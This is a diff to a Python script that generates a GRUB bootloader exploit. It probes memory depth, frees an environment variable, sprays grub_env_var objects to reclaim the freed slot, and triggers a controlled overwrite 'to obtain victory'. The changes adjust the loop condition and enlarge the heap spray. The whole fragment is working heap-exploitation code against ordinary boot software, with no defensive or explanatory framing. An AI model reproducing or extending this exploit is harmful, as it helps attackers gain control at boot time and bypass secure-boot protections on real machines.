@@ -173,13 +173,13 @@ def clashgpt(basepath):
 
     trigger += grub_print('[!] Corrupting: ${end}')
     trigger += command('if [ ${end} = NONE ] ; then normal_exit ; fi')
-    trigger += grub_print('[!] Determining Depth')
 
     # and now we try to get full control over the env vars value and the struct
     # header.
     # so then we can free it and get an object we fully control here.
     # wrapping this in a while loop so we can break from it early.
     internal = []
+    internal += grub_print('[!] Determining Depth')
     for offset in range(probe.count()):
         internal += command(f'set offset={offset}')
         internal += probe.set_active('${offset}')
@@ -195,9 +195,9 @@ def clashgpt(basepath):
                 )
         internal += probe.unset_active()
 
-    internal += ['break']
+    internal += command('break')
 
-    trigger += while_loop('1 = 1', internal)
+    trigger += while_loop('${end} != NONE', internal)
 
     # from this point on we need to be very careful about variable names, as
     # introducing a fake grub_env_var will make some inaccessible.
@@ -209,7 +209,10 @@ def clashgpt(basepath):
     internal += command('unset ${end}')
     # spray grub_env_vars to get one in our free slot
     for i in range(SPRAY_ENVVAR):
-        internal += Variable(f'spray_{i}', target=0).set('${template}'*64)
+        internal += Variable(
+            f'spray_{i}_'+'A'*96,
+            target=0
+        ).set('${template}'*128)
     # now we use our controlled overwrite....
     internal += control.trigger('${depth_}', 'fun')
     # to obtain victory
